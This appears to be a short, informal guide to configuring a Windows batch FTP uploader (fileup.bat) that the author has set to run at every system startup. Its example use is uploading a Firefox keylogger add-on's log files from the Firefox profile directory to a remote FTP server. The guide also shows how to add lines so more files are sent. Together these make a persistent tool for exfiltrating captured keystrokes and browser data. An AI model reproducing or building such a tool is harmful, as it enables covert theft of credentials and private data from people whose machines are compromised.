#change details in fileup.bat
FtpUser
YourPassword
/directoryToStoreFiles/
domainname.com


now moving forward to start this ftp uploader everytime when u bootup ur system 
we need to add it on windows startup programs list , i already did this , u don't have to care about this problem anymore

now finally define the directory from where u want to upload ur files to ur ftp server
#change these details {in eg: i installed an addonin firefox says a keylogger and want to upload its log files to my ftp then cd to log file directory }
C:
cd %appdata%
cd Mozilla/Firefox/Profiles
cd *.default


and upload ur files 

through fileup.bat 

so finally change the code at line 11
fileup.bat filename1.extension filename2.extension

you can upload two files at any instant

if you want to upload more than two files then add addition lines of code after line 7 in fileup.bat
echo put %3>> ftpcmd.dat
echo put %4>> ftpcmd.dat

by doing so you can now upload 4 files at a time
